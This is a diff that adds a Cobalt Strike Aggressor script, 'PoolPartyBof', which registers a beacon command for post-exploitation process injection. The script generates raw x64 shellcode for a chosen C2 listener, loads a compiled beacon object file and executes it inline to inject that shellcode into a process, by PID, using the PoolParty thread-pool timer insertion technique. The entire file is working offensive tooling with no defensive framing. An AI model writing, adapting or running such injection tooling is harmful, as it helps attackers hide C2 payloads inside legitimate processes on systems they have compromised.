@@ -1,0 +1,27 @@
+beacon_command_register (
+    "PoolPartyBof",
+    "Opens a process (given PID), and injects the shellcode, executes via RemoteTpTimerInsertion Variant.",
+    "Synopsis: PoolPartyBof <pid> <listener>"
+);
+
+alias PoolPartyBof {
+    $pid = $2;
+    $listener = $3;
+
+    if (listener_info($listener) is $null) {
+        berror($1, "Could not find listener $listener");
+    }
+
+    else {
+        $sc_data = artifact_payload($listener, "raw", "x64");
+
+        local('$handle $data $args');
+        $handle = openf(script_resource("PoolPartyBof.x64.o"));
+        $data = readb($handle, -1);
+        closef($handle);
+        
+        $args = bof_pack($1, "ib", $pid, $sc_data);
+        btask($1, "Opening $pid and running PoolParty with $listener listener!");
+        beacon_inline_execute($1, $data, "go", $args);
+    }
+}
